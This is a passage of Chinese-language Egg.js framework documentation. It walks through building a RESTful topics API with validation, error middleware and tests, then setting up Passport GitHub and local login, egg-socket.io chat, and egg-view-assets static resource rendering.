    "visit_count": 28176,
    "create_at": "2016-09-27T07:53:31.872Z",
  },
  {
    "id": "57ea257b3670ca3f44c5beb6",
    "author_id": "541bf9b9ad60405c1f151a03",
    "tab": "share",
    "content": "content",
    "title": "《一起学 Node.js》彻底重写完毕",
    "last_reply_at": "2017-01-11T10:20:56.496Z",
    "good": false,
    "top": true,
    "reply_count": 193,
    "visit_count": 47633,
  },
]
 获取单个主题
GET /api/v2/topics/57ea257b3670ca3f44c5beb6
响应状态码：200
响应体：
{
  "id": "57ea257b3670ca3f44c5beb6",
  "author_id": "541bf9b9ad60405c1f151a03",
  "tab": "share",
  "content": "content",
  "title": "《一起学 Node.js》彻底重写完毕",
  "last_reply_at": "2017-01-11T10:20:56.496Z",
  "good": false,
  "top": true,
  "reply_count": 193,
  "visit_count": 47633,
}
 创建主题
POST /api/v2/topics
响应状态码：201
响应体：
{
  "topic_id": "57ea257b3670ca3f44c5beb6"
}
 更新主题
PUT /api/v2/topics/57ea257b3670ca3f44c5beb6
响应状态码：204
响应体：空
 错误处理
在接口处理发生错误的时候，如果是客户端请求参数导致的错误，我们会返回 4xx 状态码，如果是服务端自身的处理逻辑错误，我们会返回 5xx 状态码。所有的异常对象都是对这个异常状态的描述，其中 error 字段是错误的描述，detail 字段（可选）是导致错误的详细原因。

例如，当客户端传递的参数异常时，我们可能返回一个响应，状态码为 422，返回响应体为：

{
  "error": "Validation Failed",
  "detail": [ { "message": "required", "field": "title", "code": "missing_field" } ]
}
 实现
在约定好接口之后，我们可以开始动手实现了。

 初始化项目
还是通过快速入门章节介绍的 egg-init 工具来初始化我们的应用

$ egg-init cnode-api --type=simple
$ cd cnode-api
$ npm i
 开启 validate 插件
我们选择 egg-validate 作为 validate 插件的示例。

// config/plugin.js
exports.validate = {
  enable: true,
  package: 'egg-validate',
};
 注册路由
首先，我们先按照前面的设计来注册路由，框架提供了一个便捷的方式来创建 RESTful 风格的路由，并将一个资源的接口映射到对应的 controller 文件。在 app/router.js 中：

// app/router.js
module.exports = app => {
  app.router.resources('topics', '/api/v2/topics', app.controller.topics);
};
通过 app.resources 方法，我们将 topics 这个资源的增删改查接口映射到了 app/controller/topics.js 文件。

 controller 开发
在 controller 中，我们只需要实现 app.resources 约定的 RESTful 风格的 URL 定义 中我们需要提供的接口即可。例如我们来实现创建一个 topics 的接口：

// app/controller/topics.js
const Controller = require('egg').Controller;

// 定义创建接口的请求参数规则
const createRule = {
  accesstoken: 'string',
  title: 'string',
  tab: { type: 'enum', values: [ 'ask', 'share', 'job' ], required: false },
  content: 'string',
};

class TopicController extends Controller {
  async create() {
    const ctx = this.ctx;
    // 校验 `ctx.request.body` 是否符合我们预期的格式
    // 如果参数校验未通过，将会抛出一个 status = 422 的异常
    ctx.validate(createRule);
    // 调用 service 创建一个 topic
    const id = await ctx.service.topics.create(ctx.request.body);
    // 设置响应体和状态码
    ctx.body = {
      topic_id: id,
    };
    ctx.status = 201;
  }
}
module.exports = TopicController;
如同注释中说明的，一个 Controller 主要实现了下面的逻辑：

调用 validate 方法对请求参数进行验证。
用验证过的参数调用 service 封装的业务逻辑来创建一个 topic。
按照接口约定的格式设置响应状态码和内容。
 service 开发
在 service 中，我们可以更加专注的编写实际生效的业务逻辑。

// app/service/topics.js
const Service = require('egg').Service;

class TopicService extends Service {
  constructor(ctx) {
    super(ctx);
    this.root = 'https://cnodejs.org/api/v1';
  }

  async create(params) {
    // 调用 CNode V1 版本 API
    const result = await this.ctx.curl(`${this.root}/topics`, {
      method: 'post',
      data: params,
      dataType: 'json',
      contentType: 'json',
    });
    // 检查调用是否成功，如果调用失败会抛出异常
    this.checkSuccess(result);
    // 返回创建的 topic 的 id
    return result.data.topic_id;
  }

  // 封装统一的调用检查函数，可以在查询、创建和更新等 Service 中复用
  checkSuccess(result) {
    if (result.status !== 200) {
      const errorMsg = result.data && result.data.error_msg ? result.data.error_msg : 'unknown error';
      this.ctx.throw(result.status, errorMsg);
    }
    if (!result.data.success) {
      // 远程调用返回格式错误
      this.ctx.throw(500, 'remote response error', { data: result.data });
    }
  }
}

module.exports = TopicService;
在创建 topic 的 Service 开发完成之后，我们就从上往下的完成了一个接口的开发。

 统一错误处理
正常的业务逻辑已经正常完成了，但是异常我们还没有进行处理。在前面编写的代码中，Controller 和 Service 都有可能抛出异常，这也是我们推荐的编码方式，当发现客户端参数传递错误或者调用后端服务异常时，通过抛出异常的方式来进行中断。

Controller 中 this.ctx.validate() 进行参数校验，失败抛出异常。
Service 中调用 this.ctx.curl() 方法访问 CNode 服务，可能由于网络问题等原因抛出服务端异常。
Service 中拿到 CNode 服务端返回的结果后，可能会收到请求调用失败的返回结果，此时也会抛出异常。
框架虽然提供了默认的异常处理，但是可能和我们在前面的接口约定不一致，因此我们需要自己实现一个统一错误处理的中间件来对错误进行处理。

在 app/middleware 目录下新建一个 error_handler.js 的文件来新建一个 middleware

// app/middleware/error_handler.js
module.exports = () => {
  return async function errorHandler(ctx, next) {
    try {
      await next();
    } catch (err) {
      // 所有的异常都在 app 上触发一个 error 事件，框架会记录一条错误日志
      ctx.app.emit('error', err, ctx);

      const status = err.status || 500;
      // 生产环境时 500 错误的详细错误内容不返回给客户端，因为可能包含敏感信息
      const error = status === 500 && ctx.app.config.env === 'prod'
        ? 'Internal Server Error'
        : err.message;

      // 从 error 对象上读出各个属性，设置到响应中
      ctx.body = { error };
      if (status === 422) {
        ctx.body.detail = err.errors;
      }
      ctx.status = status;
    }
  };
};
通过这个中间件，我们可以捕获所有异常，并按照我们想要的格式封装了响应。将这个中间件通过配置文件(config/config.default.js)加载进来：

// config/config.default.js
module.exports = {
  // 加载 errorHandler 中间件
  middleware: [ 'errorHandler' ],
  // 只对 /api 前缀的 url 路径生效
  errorHandler: {
    match: '/api',
  },
};
 测试
代码完成只是第一步，我们还需要给代码加上单元测试。

 Controller 测试
我们先来编写 Controller 代码的单元测试。在写 Controller 单测的时候，我们可以适时的模拟 Service 层的实现，因为对 Controller 的单元测试而言，最重要的部分是测试自身的逻辑，而 Service 层按照约定的接口 mock 掉，Service 自身的逻辑可以让 Service 的单元测试来覆盖，这样我们开发的时候也可以分层进行开发测试。

const { app, mock, assert } = require('egg-mock/bootstrap');

describe('test/app/controller/topics.test.js', () => {
  // 测试请求参数错误时应用的响应
  it('should POST /api/v2/topics/ 422', () => {
    app.mockCsrf();
    return app.httpRequest()
      .post('/api/v2/topics')
      .send({
        accesstoken: '123',
      })
      .expect(422)
      .expect({
        error: 'Validation Failed',
        detail: [
          { message: 'required', field: 'title', code: 'missing_field' },
          { message: 'required', field: 'content', code: 'missing_field' },
        ],
      });
  });

  // mock 掉 service 层，测试正常时的返回
  it('should POST /api/v2/topics/ 201', () => {
    app.mockCsrf();
    app.mockService('topics', 'create', 123);
    return app.httpRequest()
      .post('/api/v2/topics')
      .send({
        accesstoken: '123',
        title: 'title',
        content: 'hello',
      })
      .expect(201)
      .expect({
        topic_id: 123,
      });
  });
});
上面对 Controller 的测试中，我们通过 egg-mock 创建了一个应用，并通过 SuperTest 来模拟客户端发送请求进行测试。在测试中我们会模拟 Service 层的响应来测试 Controller 层的处理逻辑。

 Service 测试
Service 层的测试也只需要聚焦于自身的代码逻辑，egg-mock 同样提供了快速测试 Service 的方法，不再需要用 SuperTest 模拟从客户端发起请求，而是直接调用 Service 中的方法进行测试。

const { app, mock, assert } = require('egg-mock/bootstrap');

describe('test/app/service/topics.test.js', () => {
  let ctx;

  beforeEach(() => {
    // 创建一个匿名的 context 对象，可以在 ctx 对象上调用 service 的方法
    ctx = app.mockContext();
  });

  describe('create()', () => {
    it('should create failed by accesstoken error', async () => {
      try {
        await ctx.service.topics.create({
          accesstoken: 'hello',
          title: 'title',
          content: 'content',
        });
      } catch (err) {
        assert(err.status === 401);
        assert(err.message === '错误的accessToken');
        return;
      }
      throw 'should not run here';
    });

    it('should create success', async () => {
      // 不影响 CNode 的正常运行，我们可以将对 CNode 的调用按照接口约定模拟掉
      // app.mockHttpclient 方法可以便捷的对应用发起的 http 请求进行模拟
      app.mockHttpclient(`${ctx.service.topics.root}/topics`, 'POST', {
        data: {
          success: true,
          topic_id: '5433d5e4e737cbe96dcef312',
        },
      });

      const id = await ctx.service.topics.create({
        accesstoken: 'hello',
        title: 'title',
        content: 'content',
      });
      assert(id === '5433d5e4e737cbe96dcef312');
    });
  });
});
上面对 Service 层的测试中，我们通过 egg-mock 提供的 app.createContext() 方法创建了一个 Context 对象，并直接调用 Context 上的 Service 方法进行测试，测试时可以通过 app.mockHttpclient() 方法模拟 HTTP 调用的响应，让我们剥离环境的影响而专注于 Service 自身逻辑的测试上。

--------------------------------------------------
Passport 第三方登录相关
『登录鉴权』 是一个常见的业务场景，包括『账号密码登录方式』和『第三方统一登录』。

其中，后者我们经常使用到，如 Google， GitHub，QQ 统一登录，它们都是基于 OAuth 规范。

Passport 是一个扩展性很强的认证中间件，支持 Github，Twitter，Facebook 等知名服务厂商的 Strategy，同时也支持通过账号密码的方式进行登录授权校验。

Egg 在它之上提供了 egg-passport 插件，把初始化、鉴权成功后的回调处理等通用逻辑封装掉，使得开发者仅需调用几个 API 即可方便的使用 Passport 。

Passport 的执行时序如下：

用户访问页面
检查 Session
拦截跳鉴权登录页面
Strategy 鉴权
校验和存储用户信息
序列化用户信息到 Session
跳转到指定页面
 使用 egg-passport
下面，我们将以 GitHub 登录为例，来演示下如何使用。

 安装
$ npm i --save egg-passport
$ npm i --save egg-passport-github
更多插件参见 GitHub Topic - egg-passport 。

 配置
开启插件：

// config/plugin.js
module.exports.passport = {
  enable: true,
  package: 'egg-passport',
};

module.exports.passportGithub = {
  enable: true,
  package: 'egg-passport-github',
};
配置:

注意：egg-passport 标准化了配置字段，统一为 key 和 secret 。

// config/default.js
config.passportGithub = {
  key: 'your_clientID',
  secret: 'your_clientSecret',
  // callbackURL: '/passport/github/callback',
  // proxy: false,
};
注意：

创建一个 GitHub OAuth Apps，得到 clientID 和 clientSecret 信息。
填写 callbackURL，如 http://127.0.0.1:7001/passport/github/callback
线上部署时需要更新为对应的域名
路径为配置的 options.callbackURL，默认为 /passport/${strategy}/callback
如应用部署在 Nginx/HAProxy 之后，需设置插件 proxy 选项为 true, 并检查以下配置：
代理附加 HTTP 头字段：x-forwarded-proto 与 x-forwarded-host
配置中 config.proxy 应设置为 true
 挂载路由
// app/router.js
module.exports = app => {
  const { router, controller } = app;

  // 挂载鉴权路由
  app.passport.mount('github');

  // 上面的 mount 是语法糖，等价于
  // const github = app.passport.authenticate('github', {});
  // router.get('/passport/github', github);
  // router.get('/passport/github/callback', github);
}
 用户信息处理
接着，我们还需要：

首次登录时，一般需要把用户信息进行入库，并记录 Session 。
二次登录时，从 OAuth 或 Session 拿到的用户信息，读取数据库拿到完整的用户信息。
// app.js
module.exports = app => {
  app.passport.verify(async (ctx, user) => {
    // 检查用户
    assert(user.provider, 'user.provider should exists');
    assert(user.id, 'user.id should exists');

    // 从数据库中查找用户信息
    //
    // Authorization Table
    // column   | desc
    // ---      | --
    // provider | provider name, like github, twitter, facebook, weibo and so on
    // uid      | provider unique id
    // user_id  | current application user id
    const auth = await ctx.model.Authorization.findOne({
      uid: user.id,
      provider: user.provider,
    });
    const existsUser = await ctx.model.User.findOne({ id: auth.user_id });
    if (existsUser) {
      return existsUser;
    }
    // 调用 service 注册新用户
    const newUser = await ctx.service.user.register(user);
    return newUser;
  });

  // 将用户信息序列化后存进 session 里面，一般需要精简，只保存个别字段
  app.passport.serializeUser(async (ctx, user) => {
  // 处理 user
  // ...
  // return user;
  });

  // 反序列化后把用户信息从 session 中取出来，反查数据库拿到完整信息
  app.passport.deserializeUser(async (ctx, user) => {
  // 处理 user
  // ...
  // return user;
  });
};
至此，我们就完成了所有的配置，完整的示例可以参见：eggjs/examples/passport

 API
egg-passport 提供了以下扩展：

ctx.user - 获取当前已登录的用户信息
ctx.isAuthenticated() - 检查该请求是否已授权
ctx.login(user, [options]) - 为用户启动一个登录的 session
ctx.logout() - 退出，将用户信息从 session 中清除
ctx.session.returnTo= - 在跳转验证前设置，可以指定成功后的 redirect 地址
还提供了 API：

app.passport.verify(async (ctx, user) => {}) - 校验用户
app.passport.serializeUser(async (ctx, user) => {}) - 序列化用户信息后存储进 session
app.passport.deserializeUser(async (ctx, user) => {}) - 反序列化后取出用户信息
app.passport.authenticate(strategy, options) - 生成指定的鉴权中间件
options.successRedirect - 指定鉴权成功后的 redirect 地址
options.loginURL - 跳转登录地址，默认为 /passport/${strategy}
options.callbackURL - 授权后回调地址，默认为 /passport/${strategy}/callback
app.passport.mount(strategy, options) - 语法糖，方便开发者配置路由
 使用 Passport 生态
Passport 的中间件很多，不可能都进行二次封装。 接下来，我们来看看如何在框架中直接使用 Passport 中间件。 以『账号密码登录方式』的 passport-local 为例：

 安装
$ npm i --save passport-local
 配置
// app.js
const LocalStrategy = require('passport-local').Strategy;

module.exports = app => {
  // 挂载 strategy
  app.passport.use(new LocalStrategy({
    passReqToCallback: true,
  }, (req, username, password, done) => {
    // format user
    const user = {
      provider: 'local',
      username,
      password,
    };
    debug('%s %s get user: %j', req.method, req.url, user);
    app.passport.doVerify(req, user, done);
  }));

  // 处理用户信息
  app.passport.verify(async (ctx, user) => {});
  app.passport.serializeUser(async (ctx, user) => {});
  app.passport.deserializeUser(async (ctx, user) => {});
};
 挂载路由
// app/router.js
module.exports = app => {
  const { router, controller } = app;
  router.get('/', controller.home.index);

  // 鉴权成功后的回调页面
  router.get('/authCallback', controller.home.authCallback);

  // 渲染登录页面，用户输入账号密码
  router.get('/login', controller.home.login);
  // 登录校验
  router.post('/login', app.passport.authenticate('local', { successRedirect: '/authCallback' }));
};
 如何开发一个 egg-passport 插件
在上一节中，我们学会了如何在框架中使用 Passport 中间件，我们可以进一步把它封装成插件，回馈社区。

初始化：

$ egg-init --type=plugin egg-passport-local
在 package.json 中配置依赖：

{
  "name": "egg-passport-local",
  "version": "1.0.0",
  "eggPlugin": {
    "name": "passportLocal",
    "dependencies": [
      "passport"
    ]
  },
  "dependencies": {
    "passport-local": "^1.0.0"
  }
}
配置：

// {plugin_root}/config/config.default.js
// https://github.com/jaredhanson/passport-local
exports.passportLocal = {
};
注意：egg-passport 标准化了配置字段，统一为 key 和 secret，故若对应的 Passport 中间件属性名不一致时，开发者应该进行转换。

注册 passport 中间件：

// {plugin_root}/app.js
const LocalStrategy = require('passport-local').Strategy;

module.exports = app => {
  const config = app.config.passportLocal;
  config.passReqToCallback = true;

  app.passport.use(new LocalStrategy(config, (req, username, password, done) => {
    // 把 Passport 插件返回的数据进行清洗处理，返回 User 对象
    const user = {
      provider: 'local',
      username,
      password,
    };
    // 这里不处理应用层逻辑，传给 app.passport.verify 统一处理
    app.passport.doVerify(req, user, done);
  }));
};
--------------------------------------------------
Socket.IO
Socket.IO 是一个基于 Node.js 的实时应用程序框架，在即时通讯、通知与消息推送，实时分析等场景中有较为广泛的应用。

WebSocket 的产生源于 Web 开发中日益增长的实时通信需求，对比基于 http 的轮询方式，它大大节省了网络带宽，同时也降低了服务器的性能消耗； socket.io 支持 websocket、polling 两种数据传输方式以兼容浏览器不支持 WebSocket 场景下的通信需求。

框架提供了 egg-socket.io 插件，增加了以下开发规约：

namespace: 通过配置的方式定义 namespace（命名空间）
middleware: 对每一次 socket 连接的建立/断开、每一次消息/数据传递进行预处理
controller: 响应 socket.io 的 event 事件
router: 统一了 socket.io 的 event 与 框架路由的处理配置方式
 安装 egg-socket.io
 安装
$ npm i egg-socket.io --save
开启插件：

// {app_root}/config/plugin.js
exports.io = {
  enable: true,
  package: 'egg-socket.io',
};
 配置
// {app_root}/config/config.${env}.js
exports.io = {
  init: { }, // passed to engine.io
  namespace: {
    '/': {
      connectionMiddleware: [],
      packetMiddleware: [],
    },
    '/example': {
      connectionMiddleware: [],
      packetMiddleware: [],
    },
  },
};
命名空间为 / 与 /example, 不是 example

uws:

如果想要使用 uws 替代默认的 us 可以做如下配置

// {app_root}/config/config.${env}.js
exports.io = {
  init: { wsEngine: 'uws' }, // default: us
};
已知默认 wsEngine 在 Chrome 浏览器中断开连接存在异常，建议优先使用 uws

redis:

egg-socket.io 内置了 socket.io-redis，在 cluster 模式下，使用 redis 可以较为简单的实现 clients/rooms 等信息共享

// {app_root}/config/config.${env}.js
exports.io = {
  redis: {
    host: { redis server host },
    port: { redis server prot },
    auth_pass: { redis server password },
    db: 0,
  },
};
开启 redis 后，程序在启动时会尝试连接到 redis 服务器 此处 redis 仅用于存储连接实例信息，参见 #server.adapter

注意： 如果项目中同时使用了 egg-redis， 请单独配置，不可共用。

 部署
框架是以 Cluster 方式启动的，而 socket.io 协议实现需要 sticky 特性支持，否则在多进程模式下无法正常工作。

由于 socket.io 的设计，在多进程中服务器必须在 sticky 模式下工作，故需要给 startCluster 传递 sticky 参数。

修改 package.json 中 npm scripts 脚本：

{
  "scripts": {
    "dev": "egg-bin dev --sticky",
    "start": "egg-scripts start --sticky"
  }
}
Nginx 配置

location / {
  proxy_set_header Upgrade $http_upgrade;
  proxy_set_header Connection "upgrade";
  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
  proxy_set_header Host $host;
  proxy_pass   http://127.0.0.1:7001;

  # http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_bind
  # proxy_bind       $remote_addr transparent;
}
 使用 egg-socket.io
开启 egg-socket.io 的项目目录结构如下：

chat
├── app
│   ├── extend
│   │   └── helper.js
│   ├── io
│   │   ├── controller
│   │   │   └── default.js
│   │   └── middleware
│   │       ├── connection.js
│   │       └── packet.js
│   └── router.js
├── config
└── package.json
注意：对应的文件都在 app/io 目录下

 Middleware
中间件有如下两种场景：

Connection
Packet
其配置于各个命名空间下，根据上述两种场景分别发生作用。

注意：

如果我们启用了框架中间件，则会发现项目中有以下目录：

app/middleware：框架中间件
app/io/middleware：插件中间件
区别：

框架中间件基于 http 模型设计，处理 http 请求。
插件中间件基于 socket 模型设计，处理 socket.io 请求。
虽然框架通过插件尽量统一了它们的风格，但务必注意，它们的使用场景是不一样的。详情参见 issue：#1416

 Connection
在每一个客户端连接或者退出时发生作用，故而我们通常在这一步进行授权认证，对认证失败的客户端做出相应的处理

// {app_root}/app/io/middleware/connection.js
module.exports = app => {
  return async (ctx, next) => {
    ctx.socket.emit('res', 'connected!');
    await next();
    // execute when disconnect.
    console.log('disconnection!');
  };
};
踢出用户示例：

const tick = (id, msg) => {
  logger.debug('#tick', id, msg);
  socket.emit(id, msg);
  app.io.of('/').adapter.remoteDisconnect(id, true, err => {
    logger.error(err);
  });
};
同时，针对当前的连接也可以简单处理：

// {app_root}/app/io/middleware/connection.js
module.exports = app => {
  return async (ctx, next) => {
    if (true) {
      ctx.socket.disconnet();
      return;
    }
    await next();
    console.log('disconnection!');
  };
};
 Packet
作用于每一个数据包（每一条消息）；在生产环境中，通常用于对消息做预处理，又或者是对加密消息的解密等操作

// {app_root}/app/io/middleware/packet.js
module.exports = app => {
  return async (ctx, next) => {
    ctx.socket.emit('res', 'packet received!');
    console.log('packet:', this.packet);
    await next();
  };
};
 Controller
Controller 对客户端发送的 event 进行处理；由于其继承于 egg.Contoller, 拥有如下成员对象:

ctx
app
service
config
logger
详情参考 Controller 文档

// {app_root}/app/io/controller/default.js
'use strict';

const Controller = require('egg').Controller;

class DefaultController extends Controller {
  async ping() {
    const { ctx, app } = this;
    const message = ctx.args[0];
    await ctx.socket.emit('res', `Hi! I've got your message: ${message}`);
  }
}

module.exports = DefaultController;

// or async functions

exports.ping = async function() {
  const message = this.args[0];
  await this.socket.emit('res', `Hi! I've got your message: ${message}`);
};
 Router
路由负责将 socket 连接的不同 events 分发到对应的 controller，框架统一了其使用方式

// {app_root}/app/router.js

module.exports = app => {
  const { router, controller, io } = app;

  // default
  router.get('/', controller.home.index);

  // socket.io
  io.of('/').route('server', io.controller.home.server);
};
注意：

nsp 有如下的系统事件:

disconnecting doing the disconnect
disconnect connection has disconnected.
error Error occurred
 Namespace/Room
 Namespace (nsp)
namespace 通常意味分配到不同的接入点或者路径，如果客户端没有指定 nsp，则默认分配到 "/" 这个默认的命名空间。

在 socket.io 中我们通过 of 来划分命名空间；鉴于 nsp 通常是预定义且相对固定的存在，框架将其进行了封装，采用配置的方式来划分不同的命名空间。

// socket.io
var nsp = io.of('/my-namespace');
nsp.on('connection', function(socket){
  console.log('someone connected');
});
nsp.emit('hi', 'everyone!');

// egg
exports.io = {
  namespace: {
    '/': {
      connectionMiddleware: [],
      packetMiddleware: [],
    },
  },
};
 Room
room 存在于 nsp 中，通过 join/leave 方法来加入或者离开; 框架中使用方法相同；

const room = 'default_room';

module.exports = app => {
  return async (ctx, next) => {
    ctx.socket.join(room);
    ctx.app.io.of('/').to(room).emit('online', { msg: 'welcome', id: ctx.socket.id });
    await next();
    console.log('disconnection!');
  };
};
注意： 每一个 socket 连接都会拥有一个随机且不可预测的唯一 id Socket#id，并且会自动加入到以这个 id 命名的 room 中

 实例
这里我们使用 egg-socket.io 来做一个支持 p2p 聊天的小例子

 client
UI 相关的内容不重复写了，通过 window.socket 调用即可

// browser
const log = console.log;

window.onload = function () {
  // init
  const socket = io('/', {

    // 实际使用中可以在这里传递参数
    query: {
      room: 'demo',
      userId: `client_${Math.random()}`,
    },

    transports: ['websocket']
  });

  socket.on('connect', () => {
    const id = socket.id;

    log('#connect,', id, socket);

    // 接收在线用户信息
    socket.on('online', msg => {
      log('#online,', msg);
    });

    // 监听自身 id 以实现 p2p 通讯
    socket.on(id, msg => {
      log('#receive,', msg);
    });

    // 系统事件
    socket.on('disconnect', msg => {
      log('#disconnect', msg);
    });

    socket.on('disconnecting', () => {
      log('#disconnecting');
    });

    socket.on('error', () => {
      log('#error');
    });

  });

  window.socket = socket;
};
 微信小程序
微信小程序提供的 API 为 WebSocket ，而 socket.io 是 Websocket 的上层封装，故我们无法直接用小程序的 API 连接，可以使用类似 wxapp-socket-io 的库来适配。

示例代码如下：

// 小程序端示例代码
import io from 'vendor/wxapp-socket-io.js';

const socket = io('ws://127.0.0.1:7001');
socket.on('connect', function () {
  socket.emit('chat', 'hello world!');
});
socket.on('res', msg => {
  console.log('res from server: %s!', msg);
});
 server
以下是 demo 的部分代码并解释了各个方法的作用

 config
// {app_root}/config/config.${env}.js
exports.io = {
  namespace: {
    '/': {
      connectionMiddleware: [ 'auth' ],
      packetMiddleware: [ ], // 针对消息的处理暂时不实现
    },
  },

  // cluster 模式下，通过 redis 实现数据共享
  redis: {
    host: '127.0.0.1',
    port: 6379,
  },
};

// 可选
exports.redis = {
  client: {
    port: 6379,
    host: '127.0.0.1',
    password: '',
    db: 0,
  },
};
 helper
框架扩展用于封装数据格式

// {app_root}/app/extend/helper.js

module.exports = {
  parseMsg(action, payload = {}, metadata = {}) {
    const meta = Object.assign({}, {
      timestamp: Date.now(),
    }, metadata);

    return {
      meta,
      data: {
        action,
        payload,
      },
    };
  },
};
Format：

{
  data: {
    action: 'exchange',  // 'deny' || 'exchange' || 'broadcast'
    payload: {},
  },
  meta:{
    timestamp: 1512116201597,
    client: 'nNx88r1c5WuHf9XuAAAB',
    target: 'nNx88r1c5WuHf9XuAAAB'
  },
}
 middleware
egg-socket.io 中间件负责 socket 连接的处理

// {app_root}/app/io/middleware/auth.js

const PREFIX = 'room';

module.exports = () => {
  return async (ctx, next) => {
    const { app, socket, logger, helper } = ctx;
    const id = socket.id;
    const nsp = app.io.of('/');
    const query = socket.handshake.query;

    // 用户信息
    const { room, userId } = query;
    const rooms = [ room ];

    logger.debug('#user_info', id, room, userId);

    const tick = (id, msg) => {
      logger.debug('#tick', id, msg);

      // 踢出用户前发送消息
      socket.emit(id, helper.parseMsg('deny', msg));

      // 调用 adapter 方法踢出用户，客户端触发 disconnect 事件
      nsp.adapter.remoteDisconnect(id, true, err => {
        logger.error(err);
      });
    };

    // 检查房间是否存在，不存在则踢出用户
    // 备注：此处 app.redis 与插件无关，可用其他存储代替
    const hasRoom = await app.redis.get(`${PREFIX}:${room}`);

    logger.debug('#has_exist', hasRoom);

    if (!hasRoom) {
      tick(id, {
        type: 'deleted',
        message: 'deleted, room has been deleted.',
      });
      return;
    }

    // 用户加入
    logger.debug('#join', room);
    socket.join(room);

    // 在线列表
    nsp.adapter.clients(rooms, (err, clients) => {
      logger.debug('#online_join', clients);

      // 更新在线用户列表
      nsp.to(room).emit('online', {
        clients,
        action: 'join',
        target: 'participator',
        message: `User(${id}) joined.`,
      });
    });

    await next();

    // 用户离开
    logger.debug('#leave', room);

    // 在线列表
    nsp.adapter.clients(rooms, (err, clients) => {
      logger.debug('#online_leave', clients);

      // 获取 client 信息
      // const clientsDetail = {};
      // clients.forEach(client => {
      //   const _client = app.io.sockets.sockets[client];
      //   const _query = _client.handshake.query;
      //   clientsDetail[client] = _query;
      // });

      // 更新在线用户列表
      nsp.to(room).emit('online', {
        clients,
        action: 'leave',
        target: 'participator',
        message: `User(${id}) leaved.`,
      });
    });

  };
};
 controller
P2P 通信，通过 exchange 进行数据交换

// {app_root}/app/io/controller/nsp.js
const Controller = require('egg').Controller;

class NspController extends Controller {
  async exchange() {
    const { ctx, app } = this;
    const nsp = app.io.of('/');
    const message = ctx.args[0] || {};
    const socket = ctx.socket;
    const client = socket.id;

    try {
      const { target, payload } = message;
      if (!target) return;
      const msg = ctx.helper.parseMsg('exchange', payload, { client, target });
      nsp.emit(target, msg);
    } catch (error) {
      app.logger.error(error);
    }
  }
}

module.exports = NspController;
 router
// {app_root}/app/router.js
module.exports = app => {
  const { router, controller, io } = app;
  router.get('/', controller.home.index);

  // socket.io
  io.of('/').route('exchange', io.controller.nsp.exchange);
};
开两个 tab 页面，并调出控制台：

socket.emit('exchange', {
  target: 'Dkn3UXSu8_jHvKBmAAHW',
  payload: {
    msg : 'test',
  },
});

--------------------------------------------------
静态资源
egg-view-assets 提供了通用的静态资源管理和本地开发方案，有如下功能

一体化本地开发方案
生产环境静态资源映射
和模板引擎集成
在约定下可使用多种构建工具，如 webpack、roadhog、umi 等
可以先查看示例

roadhog 工具示例
umi 工具示例
Ant Design Pro 示例
 页面渲染
可通过自动或手动的方式添加静态资源，以下有两种方式

 使用 assets 模板引擎
assets 模板引擎并非服务端渲染，而是以一个静态资源文件作为入口，使用基础模板渲染出 html，并将这个文件插入到 html 的一种方式，查看使用 roadhog 的例子。

配置插件

// config/plugin.js
exports.assets = {
  enable: true,
  package: 'egg-view-assets',
}
配置 assets 模板引擎

// config/config.default.js
exports.view = {
  mapping: {
    '.js': 'assets',
  },
};
添加静态资源入口文件 app/view/index.js，然后调用 render 方法进行渲染

// app/controller/home.js
module.exports = class HomeController extends Controller {
  async render() {
    await this.ctx.render('index.js');
  }
}
渲染的结果如下

<!doctype html>
<html>
  <head>
    <link rel="stylesheet" href="http://127.0.0.1:8000/index.css"></link>
  </head>
  <body>
    <div id="root"></div>
    <script src="http://127.0.0.1:8000/index.js"></script>
  </body>
</html>
注意：这个路径生成规则是有映射的，如 index.js -> http://127.0.0.1:8000/index.js。如果本地开发工具不支持这层映射，比如自定义了 entry 配置，可以使用其他模板引擎。

 全局自定义 html 模板
一般默认的 html 无法满足需求，可以指定模板路径和模板引擎。

// config/config.default.js
module.exports = appInfo => ({
  assets: {
    templatePath: path.join(appInfo.baseDir, 'app/view/template.html'),
    templateViewEngine: 'nunjucks',
  },
});
添加模板文件

<!doctype html>
<html>
  <head>
    {{ helper.assets.getStyle() | safe }}
  </head>
  <body>
    <div id="root"></div>
    {{ helper.assets.getScript() | safe }}
  </body>
</html>
egg-view-assets 插件提供了 helper.assets 根据自己的场景调用，helper.assets.getScript() 可以不用传参，会将 render 函数的参数透传。

 页面自定义 html 模板
支持根据不同页面指定模板，可以在 render 方法传参

// app/controller/home.js
module.exports = class HomeController extends Controller {
  async render() {
    await this.ctx.render('index.js', {}, {
      templatePath: path.join(this.app.config.baseDir, 'app/view/template.html'),
      templateViewEngine: 'nunjucks',
    });
  }
}
 修改静态资源目录
以上例子是将静态资源放到 app/view 目录下，但大部分情况希望放到独立目录，如 app/assets。因为 assets 模板引擎使用 egg-view 的加载器，所以直接修改其配置

// config/config.default.js
module.exports = appInfo => ({
  view: {
    // 如果还有其他模板引擎，需要合并多个目录
    root: path.join(appInfo.baseDir, 'app/assets'),
  },
});
 使用其他模板引擎
如果无法满足文件映射，可以配合其他模板引擎使用，这时不需要配置 assets 模板引擎，查看使用 umi 的例子。

// config/config.default.js
exports.view = {
  mapping: {
    '.html': 'nunjucks',
  },
};
渲染模板

// app/controller/home.js
module.exports = class HomeController extends Controller {
  async render() {
    await this.ctx.render('index.html');
  }
}
添加模板文件（简化了 umi 的模板）

<!doctype html>
<html>
  <head>
    {{ helper.assets.getStyle('umi.css') | safe }}
  </head>
  <body>
    <div id="root"></div>
    {{ helper.assets.getScript('umi.js') | safe }}
  </body>
</html>
在其他模板中必须添加参数生成需要的静态资源路径

 上下文数据
有时候前端需要获取服务端数据，所以在渲染页面时会向 window 全局对象设置数据。

assets 模板引擎可直接传入参数，默认前端代码可以从 window.context 获取数据。

// app/controller/home.js
module.exports = class HomeController extends Controller {
  async render() {
    await this.ctx.render('index.js', { data: 1 });
  }
}
其他模板引擎需要调用 helper.assets.getContext(__context__) 并传入上下文的参数

// app/controller/home.js
module.exports = class HomeController extends Controller {
  async render() {
    await this.ctx.render('index.html', {
      __context__: { data: 1 },
    });
  }
}
默认属性为 context，这个可以通过配置修改

exports.assets = {
  contextKey: '__context__',
};
 构建工具
这种模式最重要的是和构建工具整合，保证本地开发体验及自动部署，所以构建工具和框架需要有一层约定。

下面以 roadhog 为例

 映射关系
